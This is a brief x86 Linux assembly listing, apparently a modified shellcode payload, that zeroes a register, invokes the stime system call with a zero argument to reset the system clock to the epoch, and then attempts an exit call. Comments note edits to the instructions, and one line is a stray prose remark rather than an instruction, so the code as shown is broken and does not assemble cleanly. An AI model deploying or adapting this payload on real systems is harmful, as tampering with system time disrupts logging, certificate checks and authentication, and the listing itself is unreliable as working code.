section .text
       global _start
  _start:
  ; stime([0])
       xor eax,eax

       mov al,25 ; changed push pop to mov
       cdq
       push edx
       mov ebx, esp
       int 0x80
  ; exit()
          removed inc eax ( whatever the value of eax ) 
       int 0x80